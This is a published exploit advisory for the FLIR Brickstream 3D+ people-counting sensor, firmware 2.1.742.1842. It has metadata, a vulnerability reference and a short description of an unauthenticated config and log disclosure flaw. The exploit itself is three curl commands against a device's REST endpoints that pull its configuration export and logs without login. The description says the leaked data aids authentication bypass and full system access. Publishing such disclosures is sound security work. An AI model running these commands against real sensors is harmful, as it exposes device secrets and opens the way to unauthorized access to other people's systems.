# Exploit Title: FLIR Brickstream 3D+ 2.1.742.1842 - Config File Disclosure
# Author: Gjoko 'LiquidWorm' Krstic
# Date: 2018-10-14
# Vendor: FLIR Systems, Inc.
# Product web page: http://www.brickstream.com
# Affected version: Firmware: 2.1.742.1842, Api: 1.0.0, Node: 0.10.33, Onvif: 0.1.1.47
# Tested on: Titan, Api/1.0.0
# References:
# ZSL-2018-5495
# https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5495.php

# Desc: The FLIR Brickstream 3D+ sensor is vulnerable to unauthenticated config
# download and file disclosure vulnerability when calling the ExportConfig REST
# API (getConfigExportFile.cgi). This will enable the attacker to disclose sensitive
# information and help her in authentication bypass, privilege escalation and/or
# full system access.

$ curl http://192.168.2.1:8083/getConfigExportFile.cgi
$ curl http://192.168.2.1:8083/restapi/system/ExportConfig
$ curl http://192.168.2.1:8083/restapi/system/ExportLogs